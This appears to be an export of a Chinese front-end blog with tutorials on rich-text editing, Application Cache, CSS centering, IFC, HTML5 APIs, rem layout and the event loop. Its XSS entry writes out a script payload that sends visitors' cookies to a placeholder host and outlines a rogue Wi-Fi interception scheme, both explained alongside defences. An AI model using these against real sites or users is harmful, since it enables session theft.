    <content type="text"><![CDATA[前言之前没有接触过富文本编辑器原理，在页面光标能在文本之间随意选择，删除和输入很好奇，一直以为是一种hack技术，原来页面本身有的一个属性，配合实现还有js的方法和属性。 实现原理实现富文本效果有两种方法：1. iframe+designMode，2. contenteditable。 方法一：iframe+designMode页面中iframe嵌入一个子页面，把iframe的属性designMode设为on，这个子页面的所有内容就可以想使用文字处理软件一样，对文本进行加粗、斜体等设置。 主页面 12345678910111213141516171819&lt;!DOCTYPE html&gt;&lt;html lang="en"&gt;&lt;head&gt; &lt;meta charset="UTF-8"&gt; &lt;meta http-equiv="X-UA-Compatible" content="ie=edge"&gt; &lt;title&gt;富文本编辑&lt;/title&gt;&lt;/head&gt;&lt;body&gt; &lt;iframe src="./content.html" name="richedit" style="width:400px;height:300px;"&gt;&lt;/iframe&gt; &lt;script&gt; window.addEventListener('load', function () &#123; window.frames['richedit'].document.designMode = 'on'; &#125;, false); &lt;/script&gt;&lt;/body&gt;&lt;/html&gt; content.html子页面 1234567891011121314151617181920&lt;!DOCTYPE html&gt;&lt;html lang="en"&gt;&lt;head&gt; &lt;meta charset="UTF-8"&gt; &lt;meta http-equiv="X-UA-Compatible" content="ie=edge"&gt; &lt;title&gt;Document&lt;/title&gt;&lt;/head&gt;&lt;body&gt; &lt;h1&gt;富文本编辑器标题&lt;/h1&gt; &lt;header&gt; &lt;nav&gt;导航栏&lt;/nav&gt; &lt;/header&gt; &lt;main&gt; &lt;section&gt;内容区块&lt;/section&gt; &lt;section&gt;这里是一些内容，这里是一些内容，这里是一些内容&lt;/section&gt; &lt;/main&gt; &lt;footer&gt;底部版权相关申明&lt;/footer&gt;&lt;/body&gt;&lt;/html&gt; 实现效果 方法二：contenteditable可以把contenteditable属性应用到页面中的任何元素，然后用户立即就可以编辑该元素，而不需要iframe页。 12345678910&lt;section class="editable" id="richedit"&gt; &lt;h2&gt;标题栏&lt;/h2&gt; &lt;nav&gt;导航栏&lt;/nav&gt; &lt;article&gt;内容主体部分&lt;/article&gt;&lt;/section&gt;&lt;script&gt; $richedit = document.getElementById('richedit'); $richedit.contentEditable = 'true';&lt;/script&gt; 实现效果 操作富文本只展示富文本的效果意义不大，实际应用中，更多结合用户操作交互，产生想要的效果，js中已提供相应api。 document.execCommand()document.execCommand()对文档执行预定义的命令，而且可以应用大多数格式。可以传递3个参数：要执行命令的名称、浏览器是否为命令提供用户界面的一个布尔值和执行命令必须的值（无需则为null）。 设置粗体document.execCommand(&#39;bold&#39;, false, null); ps:需要注意的是执行bold命令，IE和Opera会使用&lt;strong&gt;标签包围文本，Safari和Chrome使用&lt;b&gt;标签，而Firefox则使用’‘标签，由于各个浏览器实现命令的方式不同，加上通过innerHTML实现转化的方式也不一样，所以不能指望富文本编辑器会产生一致的HTML。 设置斜体 document.execCommand(&#39;italic&#39;, false, null) 设置居中对齐document.execCommand(&#39;justifycenter&#39;, false, null); 设置插入图片document.execCommand(&#39;insertimage&#39;, false, &#39;./position.png&#39;); 设置字体大小document.execCommand(&#39;fontsize&#39;, false, this.value); 当然，还有一些其他的设置命令，比如backcolor设置背景色，indent缩进文本，formatblock要包围当前文本块HTML标签，copy将选中文本复制到剪贴板等。 除了命令之外，还有于之相关的一些方法： document.queryCommandEnabled()检测某个命令是否可以针对当前选择的文本。比如document.queryCommandEnabled(&#39;bold&#39;)返回true表示对当前选中的文本可以执行bold命令。 document.queryCommandState()确定是否已将指定命令应用到选择的文本。比如document.queryCommandState(&#39;bold&#39;)返回true表示当前选中的文本用了bold命令加粗的。 document.queryCommandValue()获取执行命令传入的值。比如document.queryCommandValue(&#39;fontsize&#39;)返回5，则用fontsize命令传入的值是5。 富文本选区为了更精细化控制富文本编辑器的内容，可以使用document.getSelection()方法，返回Selection对象。在Selection对象上提供了很多实用的方法。 1234567891011121314var selection = document.getSelection();console.log('当前选中的文本：');console.log(selection.toString());// 取得代表选区的范围var range = selection.getRangeAt(0);console.log(range);// 包裹一个标签使得选中内容突出var span = document.createElement('span');span.style.backgroundColor = '#f0f';range.surroundContents(span);console.log('当前文本编辑器内容：');console.log($richedit.innerHTML); 总结一般来说，为了便利性，安全性，避免重复造轮子，在实际工作中都是直接用一些开源组织编写的富文本编辑器，比如ueditor,umEditor,handEditor等，当然应用在一些场景也是需要自己理解和会写一部分功能，比如在线文档。]]></content>
      <categories>
        <category>javascript</category>
      </categories>
      <tags>
        <tag>javascript 富文本</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[HTML5离线存储之Application Cache]]></title>
    <url>%2F2018%2F08%2F27%2FHTML5%E7%A6%BB%E7%BA%BF%E5%AD%98%E5%82%A8%E4%B9%8BApplication%20Cache%2F</url>
    <content type="text"><![CDATA[关于html5的离线存储，大致可分为： localStorage, sessionStorage indexedDB web sql application cache 可以在chrome的debug工具/Resources下产看，下面来着重说明一下Application Cache。 访问流程 当我们第一次正确配置app cache后，当我们再次访问该应用时，浏览器会首先检查manifest文件是否有变动，如果有变动就会把相应的变得跟新下来，同时改变浏览器里面的app cache，如果没有变动，就会直接把app cache的资源返回，基本流程是这样的。 特点 离线浏览: 用户可以在离线状态下浏览网站内容 更快的速度: 因为数据被存储在本地，所以速度会更快 减轻服务器的负载: 浏览器只会下载在服务器上发生改变的资源 如何使用首先，我们建立一个html文件，类似这样： 1234&lt;html lang=&quot;en&quot; mainfest=&quot;index.manifest&quot;&gt; &lt;head&gt;&lt;/head&gt; &lt;body&gt;&lt;/body&gt;&lt;/html&gt; 可能有些代码看不懂，我们先看最简单的，第一行配置了一个manifest=”manifest.appcache”（注意是mani不是main），这是使用app cache首先要配置的，然后我们在这个html文件里引入了两个img做为测试用，然后监听了load时间来查看看application的status，关于applicationCache的api，可以查看。 然后在相同目录下新建一个manifest.appcache文件，注意关于路径要和html页面配置时一致即可。 123456789CACHE MANIFEST#version 1.3CACHE:img/1.jpgimg/2.jpgtest.cssNETWORK:* 关于manifest.appcache文件，基本格式为三段： CACHE，NETWORK，与 FALLBACK，其中NETWORK和FALLBACK为可选项，而第一行CACHE MANIFEST为固定格式，必须写在前面。 CACHE:（必须） 标识出哪些文件需要缓存，可以是相对路径也可以是绝对路径。例如：aa.css，http://www.baidu.com/aa.js. NETWORK:（可选） 这一部分是要绕过缓存直接读取的文件，可以使用通配符＊，,也就是说除了上面的cache文件，剩下的文件每次都要重新拉取。例如＊，login.php。 FALLBACK:（可选） 指定了一个后备页面，当资源无法访问时，浏览器会使用该页面。该段落的每条记录都列出两个 URI—第一个表示资源，第二个表示后备页面。两个 URI 都必须使用相对路径并且与清单文件同源。可以使用通配符。例如*.html /offline.html。 有了上面两个文件之后还要配置服务器的mime.types类型，找大盘apache的mime.types文件，添加 1text/cache-manifest .appcache OK，上面文件配置完成之后，application cache就可以运行了。查看console： 可以看到，一下子这么多log，但是除了4是我们console的log之外，其他的都是appcache自己打的，因为我们配置了manifest，系统会默认打出appcache的log。关于status的值： 然后，通过log，我们看到一些文件已经被缓存，我们可以查看chrome Resources来查看： 证明直接从缓存拿去文件： 更新缓存的方式 更新manifest文件 浏览器发现manifest文件本身发生变化，便会根据新的manifest文件去获取新的资源进行缓存。 当manifest文件列表并没有变化的时候，我们通常通过修改manifest注释的方式来改变文件，从而实现更新。 通过javascript操作 浏览器提供了applicationCache供js访问，通过对于applicationCache对象的操作也能达到更新缓存的目的。 清除浏览器缓存 对于第一种，我们修改一下manifest文件，把version改为1.4，然后刷新页面。 我们可以发现，appcache更新了缓存重新从网络上拉去的cache的文件，但是，我们如果想要看到改变，必须再次刷新页面。 对于第二种方法，我们首先修改一下我们的js，添加一个监听事件： 1234window.applicationCache.addEventListener(&apos;updateready&apos;, function()&#123; console.log(&apos;updateready!&apos;); window.applicationCache.swapCache();&#125;); 清除浏览器缓存再试一次，这次我们在console里调用window.applicationCache.update();，看看发生了什么： updateready事件触发了，同样，appcache也更新了缓存，其中swapCache方法的意思是重新应用跟新后的缓存来替换原来的缓存！，到这里后基本的appcache也差不多了。 注意事项： 站点离线存储的容量限制是5M 如果manifest文件，或者内部列举的某一个文件不能正常下载，整个更新过程将视为失败，浏览器继续全部使用老的缓存 引用manifest的html必须与manifest文件同源，在同一个域下 FALLBACK中的资源必须和manifest文件同源 当一个资源被缓存后，该浏览器直接请求这个绝对路径也会访问缓存中的资源。 站点中的其他页面即使没有设置manifest属性，请求的资源如果在缓存中也从缓存中访问 当manifest文件发生改变时，资源请求本身也会触发更新]]></content>
      <categories>
        <category>html</category>
      </categories>
      <tags>
        <tag>缓存</tag>
        <tag>html5</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[水平且垂直居中方法（9种）]]></title>
    <url>%2F2018%2F08%2F27%2F%E6%B0%B4%E5%B9%B3%E4%B8%94%E5%9E%82%E7%9B%B4%E5%B1%85%E4%B8%AD%E6%96%B9%E6%B3%95%EF%BC%889%E7%A7%8D%EF%BC%89%2F</url>
    <content type="text"><![CDATA[水平且垂直居中方法有哪些？这在实际工作中经常用到，小记一下。 演示HTML结构1234567&lt;div id="div1" class="div"&gt; &lt;div id="div2"&gt; &lt;div id="div3"&gt; &lt;span&gt;i&lt;/span&gt; &lt;/div&gt; &lt;/div&gt;&lt;/div&gt; 一般的，水平居中相对垂直居中简单很多，对于内联元素，父级元素设置text-align: center;；对于块级元素，子级元素设置margin: 0 auto;。以下结合水平居中强调实现垂直居中。 1、已知父级元素宽高，父级元素定位非static，子级元素定位设为position: absolute/fixed，再利用margin、left和top属性居中。1234567891011121314151617#div1 &#123; width: 200px; height: 200px; position: relative; background-color: #ffff00;&#125;#div2 &#123; width: 100px; height: 100px; position: absolute; top: 50%; left: 50%; margin-left: -50px; margin-top: -50px; background-color: #ff00ff;&#125; 注：需要已知父级元素固定宽高，才能确定margin-left和margin-right。 2、子级元素是内联元素，父级元素设置line-height属性垂直居中。1234567891011121314151617#div1 &#123; width: 200px; height: 200px; line-height: 120px; text-align: center; position: relative; background-color: #ffff00;&#125;#div2 &#123; width: 100px; height: 100px; line-height: normal; text-align: left; display: inline-block; background-color: #ff00ff;&#125; 注：需要已知父级元素的固定高度，才可以确定line-height。 3、子级元素是内联元素，父级元素用display: table-cell;和vertical-align: middle;属性实现垂直居中。123456789101112131415#div1 &#123; width: 200px; height: 200px; display: table-cell; text-align: center; vertical-align: middle; background-color: #ffff00;&#125;#div2 &#123; width: 100px; height: 100px; display: inline-block; background-color: #ff00ff;&#125; 注：无需要确定父级元素的宽高，inline-block、table-cell不兼容ie67 4、对于子级是块级元素，父级元素同样用display: table-cell;和vertical-align: middle;属性实现垂直居中，水平方向居中用margin: 0 auto;。1234567891011121314#div1 &#123; width: 200px; height: 200px; display: table-cell; vertical-align: middle; background-color: #ffff00;&#125;#div2 &#123; width: 100px; height: 100px; margin: 0 auto; background-color: #ff00ff;&#125; 注：无需要确定父级元素的宽高，table-cell不兼容ie67 5、利用css3 translate特性：位移是基于元素宽高的。12345678910111213141516171819#div1 &#123; width: 200px; height: 200px; position: relative; background-color: #ffff00;&#125;#div2 &#123; width: 100px; height: 100px; position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%); -webkit-transform: translate(-50%, -50%); -moz-transform: translate(-50%, -50%); -ms-transform: translate(-50%, -50%); background-color: #ff00ff;&#125; 注：无需要确定父级元素的宽高，translate属性兼容IE9+ 6、当父级是浮动的，用display: table-cell;会失效，这时需要包三层，第一层display: table;，第二层display: table-cell; 第三次居中层12345678910111213141516171819202122232425#div1 &#123; width: 200px; height: 200px; position: relative; display: table; background-color: #ffff00; float: left;&#125;#div2 &#123; width: 100%; height: 100%; display: table-cell; vertical-align: middle; /* text-align: center; */ background-color: #cccccc;&#125;#div3 &#123; width: 100px; height: 100px; margin: 0 auto; /* display: inline-block; */ background-color: #ff00ff;&#125; 注：无需要确定父级元素的宽高，但HTML标签层数较多。 7、绝对定位加四边定位为0。123456789101112131415161718#div1 &#123; width: 200px; height: 200px; position: relative; background-color: #ffff00;&#125;#div2 &#123; width: 100px; height: 100px; top: 0; left: 0; right: 0; bottom: 0; margin: auto; position: absolute; background-color: #cccccc;&#125; 注：无需要确定父级元素的宽高，但把定位属性全用上了 8、利用flex布局justify-content: center;和align-items: center;属性居中。123456789101112131415#div1 &#123; width: 200px; height: 200px; display: flex; flex-direction: row; justify-content: center; align-items: center; background-color: #ffff00;&#125;#div2 &#123; width: 100px; height: 100px; background-color: #cccccc;&#125; 注：无需要确定父级元素的宽高，兼容IE10+ 9、利用grid布局，划分成3x3栅格，第二行第二列格子垂直水平居中12345678910111213141516#div1 &#123; width: 200px; height: 200px; display: grid; background-color: #ffff00; grid-template-columns: repeat(3, 1fr); grid-template-rows: repeat(3, 1fr);&#125;#div2 &#123; width: 100px; height: 100px; background-color: #cccccc; grid-row-start: 2; grid-column-start: 2;&#125; 注：无需要确定父级元素的宽高，兼容性Firefox 52, Safari 10.1, Chrome 57, Opera 44]]></content>
      <categories>
        <category>css</category>
      </categories>
      <tags>
        <tag>css</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[深入理解IFC]]></title>
    <url>%2F2018%2F08%2F27%2F%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3IFC%2F</url>
    <content type="text"><![CDATA[概念规则 FC(Inline formatting context)，即行内格式化上下文，它和BFC一样，既不是属性也不是元素，而是一种，一种上下文。 在IFC中，框（boxs）一个接一个水平排列，起点是包含块的顶部。水平方向上的margin，border和padding在框之间得到保留。框在垂直方向上可以以不同的方式对齐：它们的顶部或底部对齐，或根据其中文字的基线对齐。包括那些框的长方形区域，会形成一行，叫做行框（line box）。 一个line box的宽度由包含它的元素的宽度和包含它的元素里面有没有float元素来决定，而高度由内部元素中实际高度最高的元素计算出来。 line box的高度是足够高来包含他内部容器们的，也可能不比它包含的容器们都高（比如在基线对齐的时候），当它包含的内部容器的高度小于line box的高度时，内部容器的垂直位置由自己的vertical这个属性来确定。当内部的容器盒子太多，一个line box装不下，它们折行之后会变成两个或多个line box，line box们相互之间垂直方向不能分离，不能重叠。 一般来说，line box的左边缘挨着包含它的元素的左边缘，并且右边缘挨着包含它的元素的右边缘，浮动元素会在包含他们元素的边缘和line box的边缘之间，所以，虽然在同一个IFC下的line box们通常拥有相同的宽度（就是包含它们容器的宽度），但是也会因为浮动元素捣乱，导致line box们的可用宽度产生变化不一样了。在同一个IFC下的line box们的高度也会不一样（比如说，一个line box里有个比较打的image） 当内联元素的宽度超过line box宽度，那么它会折行分裂成几个line box，如果这个元素里面的内容不可以折行，那么内联元素会溢出line box。 当一个内联元素分裂时，分裂处的margin，border和padding不会有视觉效果。 line box的生存条件时IFC中包含inine-level元素，如果line box没有文本，空白，换行符，内联元素，也灭有其他的存在IFC环境中的元素（如inline-block，inline-table，image等），将被视为零高度，也将被视为没意义。 123456789101112131415161718&lt;style&gt; .verticle-middle &#123; width: 150px; height: 200px; background-color: #ccc; &#125; .verticle-middle span &#123; padding: 20px; &#125;&lt;/style&gt;&lt;section class=&quot;verticle-middle ifc&quot;&gt; &lt;span&gt;垂直居中&lt;/span&gt;&lt;span&gt;垂直居中&lt;/span&gt;&lt;span&gt;垂直居中&lt;/span&gt; &lt;span&gt;垂直居中&lt;/span&gt;&lt;span&gt;垂直居中&lt;/span&gt;&lt;span&gt;垂直居中&lt;/span&gt; &lt;span&gt;垂直居中&lt;/span&gt;&lt;span&gt;垂直居中&lt;/span&gt;&lt;span&gt;垂直居中&lt;/span&gt; &lt;span&gt;垂直居中&lt;/span&gt;&lt;span&gt;垂直居中&lt;/span&gt;&lt;span&gt;垂直居中&lt;/span&gt;&lt;/section&gt; 实例应用在一个line box中，当他包含的内部容器的高度小于line box的高度的时候，内部容器的垂直位置由自己的vertical属性来确定。那么，我们设想一下，如果手动创建一个IFC环境，让line box的高度时包含块的高度的100%，让line box内部的元素使用vertical-align:middle，就可以实现垂直居中了。 12345678910111213141516171819202122232425262728293031323334&lt;style&gt; .verticle-middle &#123; width: 300px; height: 200px; background-color: #ccc; &#125; .verticle-middle &gt; div &#123; display: inline-block; vertical-align: middle; &#125; .verticle-middle img &#123; vertical-align: middle; &#125; .verticle-middle span &#123; padding: 20px; &#125; .ifc:after &#123; display: inline-block; content: &quot;&quot;; width: 0; height: 100%; vertical-align: middle; &#125;&lt;/style&gt;&lt;section class=&quot;verticle-middle ifc&quot;&gt; &lt;div&gt; &lt;img src=&quot;image/demo.jpg&quot; alt=&quot;&quot;&gt; &lt;span&gt;垂直居中&lt;/span&gt; &lt;/div&gt;&lt;/section&gt;]]></content>
      <categories>
        <category>css</category>
      </categories>
      <tags>
        <tag>css IFC</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[xss攻击]]></title>
    <url>%2F2018%2F08%2F27%2Fxss%E6%94%BB%E5%87%BB%2F</url>
    <content type="text"><![CDATA[XSS（cross-site scripting跨域脚本攻击）攻击是最常见的web攻击，其重点是“跨域”和“客户端执行”。XSS攻击分为三种，分别是： Reflected XSS（基于反射的XSS攻击） Stored XSS（基于存储的XSS攻击） DOM-based or local XSS（基于DOM或本地的XSS攻击） 1、Reflected XSS基于反射的XSS攻击，主要依靠站点服务端返回脚本，再客户端触发执行从而发起Web攻击。 例子 1、做个假设，当亚马逊在搜索书籍，搜不到书的时候显示提交的名称。 2、在搜索框搜索内容，填入“alert(‘handsome boy’)”, 点击搜索。 3、当前端页面没有对返回的数据进行过滤，直接显示在页面上，这时就会alert那个字符串出来。 4、进而可以构造获取用户cookies的地址，通过QQ群或者垃圾邮件，来让其他人点击这个地址： 1http://www.amazon.cn/search?name=&lt;script&gt;document.location=&apos;http://xxx/get?cookie=&apos;+document.cookie&lt;/script&gt; 安全措施 前端在显示服务端数据时候，不仅是标签内容需要过滤、转义，就连属性值也都可能需要。 后端接收请求时，验证请求是否为攻击请求，攻击则屏蔽。 2、Stored XSS基于存储的XSS攻击，是通过发表带有恶意跨域脚本的帖子/文章，从而把恶意脚本存储在服务器，每个访问该帖子/文章的人就会触发执行。 例子 发一篇文章，里面包含了恶意脚本 1今天天气不错啊！&lt;script&gt;alert(&apos;handsome boy&apos;)&lt;/script&gt; 后端没有对文章进行过滤，直接保存文章内容到数据库。 当其他看这篇文章的时候，包含的恶意脚本就会执行。 安全措施 首要是服务端要进行过滤，因为前端的校验可以被绕过。 当服务端不校验时候，前端要以各种方式过滤里面可能的恶意脚本，例如script标签，将特殊字符转换成HTML编码。 3、DOM-based or local XSS基于DOM或本地的XSS攻击。一般是提供一个免费的wifi，但是提供免费wifi的网关会往你访问的任何页面插入一段脚本或者是直接返回一个钓鱼页面，从而植入恶意脚本。这种直接存在于页面，无须经过服务器返回就是基于本地的XSS攻击。 例子 提供一个免费的wifi。 开启一个特殊的DNS服务，将所有域名都解析到我们的电脑上，并把Wifi的DHCP-DNS设置为我们的电脑IP。 之后连上wifi的用户打开任何网站，请求都将被我们截取到。我们根据http头中的host字段来转发到真正服务器上。 收到服务器返回的数据之后，我们就可以实现网页脚本的注入，并返回给用户。 当注入的脚本被执行，用户的浏览器将依次预加载各大网站的常用脚本库。 安全措施使用HTTPS!]]></content>
      <categories>
        <category>其它</category>
      </categories>
      <tags>
        <tag>安全</tag>
        <tag>xss</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[html5 新型api]]></title>
    <url>%2F2018%2F08%2F27%2Fhtml5%20%E6%96%B0%E5%9E%8Bapi%2F</url>
    <content type="text"><![CDATA[Page Visibility API为了解决隐藏或最小化标签页，让开发人员知道，有哪些功能可以停下来，```,``` visibilitychange ```事件12 document.addEventListener(‘msvisibilitychange’, handleVisibilityChange);document.addEventListener(‘webkitvisibilitychange’, handleVisibilityChange); function handleVisibilityChange () { var msg = ‘’; // 检测当前页面是否被隐藏 if (document.hidden || document.msHidden || document.webkitHidden) { msg = &apos;Page has hidden&apos; + new Date(); } else { msg = &apos;Page is visible now &apos; + new Date(); } console.log(msg); }12345678910111213141516171819202122232425262728293031323334353637383940### requestAnimationFrame使用原始的`setTimeout`和`setInterval`定时器方法创建动画不精确，HTML5优化这个问题，提供一个api，避免过度渲染，解决精度低问题。```javascriptvar requestAnimationFrame = window.requestAnimationFrame || window.msRequestAnimationFrame || window.mozRequestAnimationFrame || window.webkitRequestAnimationFrame;var startTime = window.mozRequestAnimationStartTime || Date.now();requestAnimationFrame(draw);var dist = 500;var start = 0;var step = 10;var $block = document.getElementById(&apos;block&apos;);function draw (timestamp) &#123; var drawStart = (timestamp || Date.now()); var diff = drawStart - startTime; var next = start + step; $block.style.left = next + &apos;px&apos;; start = next; if(start &gt; dist) &#123; // cancelAnimationFrame(); return false; &#125; console.log(&apos;diff:&apos;, diff); // 把startTime重写为这一次的绘制时间 startTime = drawStart; // 重绘UI requestAnimationFrame(draw);&#125;]]></content>
      <categories>
        <category>html</category>
      </categories>
      <tags>
        <tag>html5</tag>
        <tag>javascript</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[移动端适配-rem]]></title>
    <url>%2F2018%2F08%2F27%2F%E7%A7%BB%E5%8A%A8%E7%AB%AF%E9%80%82%E9%85%8D-rem%2F</url>
    <content type="text"><![CDATA[通过js去动态计算根元素的font-size，这样所有设备分辨率都能兼容适应1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950//designWidth:设计稿的实际宽度值，需要根据实际设置//maxWidth:制作稿的最大宽度值，需要根据实际设置//这段js的最后面有两个参数记得要设置，一个为设计稿实际宽度，一个为制作稿最大宽度，例如设计稿为750，最大宽度为750，则为(750,750);(function(designWidth, maxWidth) &#123; var doc = document, win = window, docEl = doc.documentElement, remStyle = document.createElement(&quot;style&quot;), tid; function refreshRem() &#123; var width = docEl.getBoundingClientRect().width; maxWidth = maxWidth || 540; width &gt; maxWidth &amp;&amp; (width = maxWidth); var rem = width * 100 / designWidth; remStyle.innerHTML = &apos;html&#123;font-size:&apos; + rem + &apos;px;&#125;&apos;; &#125; if (docEl.firstElementChild) &#123; docEl.firstElementChild.appendChild(remStyle); &#125; else &#123; var wrap = doc.createElement(&quot;div&quot;); wrap.appendChild(remStyle); doc.write(wrap.innerHTML); wrap = null; &#125; //要等 wiewport 设置好后才能执行 refreshRem，不然 refreshRem 会执行2次； refreshRem(); win.addEventListener(&quot;resize&quot;, function() &#123; clearTimeout(tid); //防止执行两次 tid = setTimeout(refreshRem, 300); &#125;, false); win.addEventListener(&quot;pageshow&quot;, function(e) &#123; if (e.persisted) &#123; // 浏览器后退的时候重新计算 clearTimeout(tid); tid = setTimeout(refreshRem, 300); &#125; &#125;, false); if (doc.readyState === &quot;complete&quot;) &#123; doc.body.style.fontSize = &quot;16px&quot;; &#125; else &#123; doc.addEventListener(&quot;DOMContentLoaded&quot;, function(e) &#123; doc.body.style.fontSize = &quot;16px&quot;; &#125;, false); &#125;&#125;)(640, 750); 当然也可以用media query设置适配集中主流的屏幕尺寸 12345678910111213141516171819202122232425262728html &#123; font-size : 20px;&#125;@media only screen and (min-width: 401px)&#123; html &#123; font-size: 25px !important; &#125;&#125;@media only screen and (min-width: 428px)&#123; html &#123; font-size: 26.75px !important; &#125;&#125;@media only screen and (min-width: 481px)&#123; html &#123; font-size: 30px !important; &#125;&#125;@media only screen and (min-width: 569px)&#123; html &#123; font-size: 35px !important; &#125;&#125;@media only screen and (min-width: 641px)&#123; html &#123; font-size: 40px !important; &#125;&#125; 提供一个移动端base.css123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175body,dl,dd,ul,ol,h1,h2,h3,h4,h5,h6,pre,form,input,textarea,p,hr,thead,tbody,tfoot,th,td &#123; margin: 0; padding: 0;&#125;ul,ol &#123; list-style: none;&#125;a &#123; text-decoration: none;&#125;html &#123; -ms-text-size-adjust: none; -webkit-text-size-adjust: none; text-size-adjust: none;&#125;body &#123; line-height: 1.5; font-size: 14px;&#125;body,button,input,select,textarea &#123; font-family: &apos;helvetica neue&apos;, tahoma, &apos;hiragino sans gb&apos;, stheiti, &apos;wenquanyi micro hei&apos;, \5FAE\8F6F\96C5\9ED1, \5B8B\4F53, sans-serif;&#125;b,strong &#123; font-weight: bold;&#125;i,em &#123; font-style: normal;&#125;table &#123; border-collapse: collapse; border-spacing: 0;&#125;table th,table td &#123; border: 1px solid #ddd; padding: 5px;&#125;table th &#123; font-weight: inherit; border-bottom-width: 2px; border-bottom-color: #ccc;&#125;img &#123; border: 0 none; width: auto\9; max-width: 100%; vertical-align: top; height: auto;&#125;button,input,select,textarea &#123; font-family: inherit; font-size: 100%; margin: 0; vertical-align: baseline;&#125;button,html input[type=&quot;button&quot;],input[type=&quot;reset&quot;],input[type=&quot;submit&quot;] &#123; -webkit-appearance: button; cursor: pointer;&#125;button[disabled],input[disabled] &#123; cursor: default;&#125;input[type=&quot;checkbox&quot;],input[type=&quot;radio&quot;] &#123; box-sizing: border-box; padding: 0;&#125;input[type=&quot;search&quot;] &#123; -webkit-appearance: textfield; -moz-box-sizing: content-box; -webkit-box-sizing: content-box; box-sizing: content-box;&#125;input[type=&quot;search&quot;]::-webkit-search-decoration &#123; -webkit-appearance: none;&#125;input:focus &#123; outline: none;&#125;select[size],select[multiple],select[size][multiple] &#123; border: 1px solid #AAA; padding: 0;&#125;article,aside,details,figcaption,figure,footer,header,hgroup,main,nav,section,summary &#123; display: block;&#125;audio,canvas,video,progress &#123; display: inline-block;&#125;body &#123; background: #fff;&#125;input::-webkit-input-speech-button &#123; display: none&#125;button,input,textarea &#123; -webkit-tap-highlight-color: rgba(0, 0, 0, 0);&#125;]]></content>
      <categories>
        <category>mobile</category>
      </categories>
      <tags>
        <tag>css</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[理解同步、异步和事件循环]]></title>
    <url>%2F2018%2F08%2F27%2F%E7%90%86%E8%A7%A3%E5%90%8C%E6%AD%A5%E3%80%81%E5%BC%82%E6%AD%A5%E5%92%8C%E4%BA%8B%E4%BB%B6%E5%BE%AA%E7%8E%AF%2F</url>
    <content type="text"><![CDATA[JavaScript运行机制： 所有同步任务都在主线程上执行，形成一个执行栈； 主线程发起异步请求，相应的工作线程就会去执行异步任务，主线程可以继续执行后面的代码； 主线程之外，还存在一个”任务队列”（task queue）。只要异步任务有了运行结果，就在”任务队列”之中放置一个事件，也就是一个消息； 一旦”执行栈”中的所有同步任务执行完毕，系统就会读取”任务队列”，看看里面有哪些事件。那些对应的异步任务，于是结束等待状态，进入执行栈，开始执行； 主线程把当前的事件执行完成之后，再去读取任务队列，如此反复重复执行，这样就行程了事件循环。 1、单线程JS引擎在解释和执行JavaScript代码线程只有一个，叫做主线程。但实际还存在其他线程，如：处理Ajax请求线程，处理DOM事件线程，定时器线程，和文件读写线程等，叫做工作线程。 2、同步和异步同步：如果函数返回的时候，调用者就能够得到预期结果。 1Math.sqrt(2); 异步：函数返回的时候，调用者还不能够得到预期结果，而是需要通过一定手段得到。 123fs.readFile(&quot;foo.txt&quot;, &quot;utf8&quot;, function(err, data)&#123; console.log(data)&#125;) 上面代码中，我们希望fs.readFile函数读取文件，并打印出来，但是在fs.readFile函数返回时，我们期望的结果并不会发生，而是要等文件全部读取完成之后。 异步AJAX： 主线程：“你好，AJAX线程。请你帮我发个HTTP请求吧，我把请求地址和参数都给你了。” AJAX线程：“好的，主线程。我马上去发，但可能要花点儿时间呢，你可以先去忙别的。” 主线程：：“谢谢，你拿到响应后告诉我一声啊。” (接着，主线程做其他事情去了。一顿饭的时间后，它收到了响应到达的通知。) 同步AJAX： 主线程：“你好，AJAX线程。请你帮我发个HTTP请求吧，我把请求地址和参数都给你了。” AJAX线程：“……” 主线程：：“喂，AJAX线程，你怎么不说话？” AJAX线程：“……” 主线程：：“喂！喂喂喂！” AJAX线程：“……” (一炷香的时间后) 主线程：：“喂！求你说句话吧！” AJAX线程：“主线程，不好意思，我在工作的时候不能说话。你的请求已经发完了，拿到响应数据了，给你。” 正因为JavaScript时单线程，同步容易造成阻塞，所以，对于耗时和操作事件不确定操作，使用异步就成了必然选择。 3、异步过程一个异步过程通常时这样的： 主线程发起一个异步请求，相应的工作线程接收线程请求并告知主线程已收到；主线程可以继续执行后面的代码，同时工作线程执行异步任务；工作线程完成工作后，通知主线程；主线程收到通知后，执行一定动作（调用回调函数）。 异步函数通常具有一下形式： 1A(arg..., callbackFn) 他可以叫做异步过程的发起函数，或者叫做异步任务注册函数。 从主线程的角度看，一个一度过程包括两个要素： 发起函数（注册函数） 回到函数 4、消息队列和事件循环异步过程中，工作线程在异步操作完成后需要通知主线程。那么这个通知机制时怎样实现的呢？答案是利用消息队列和事件循环。 一句话概括： 工作线程将消息放到消息队列，主线程通过事件循环过程去取消息。 消息队列：消息队列是一个先进先出的队列，放着各种消息。 事件循环：事件循环是指主线程从消息队列中取消息，执行的过程。 实际上，主线程只会做一件事，就是从消息队列里面取消息、执行消息，再去消息，再执行。当消息队列为空时，就会等待知道消息队列变成非空。而且主线程只有在将当前的消息执行完成后，才会去取下一个消息。这种机制就叫做事件循环机制，取一个消息并执行的过程叫做一次循环。 消息队列中放的消息是什么东西？消息的具体结构当然跟具体的实现有关，可以认为： 消息就是注册异步任务时添加的回调函数。 以异步Ajax为例 123$.ajax(&apos;http://segmentfault.com&apos;, function(resp) &#123; console.log(&apos;我是响应：&apos;, resp);&#125;); 主线程发起Ajax请求后，会继续执行其他代码。Ajax线程负责请求 segmentfault.com，拿到响应后，它会把响应封装成一个JavaScript对象，然后构成一条消息： 1234var message = function() &#123; callbackFn();&#125; 其中callbackFn就是前面代码中成功响应时的回调函数。 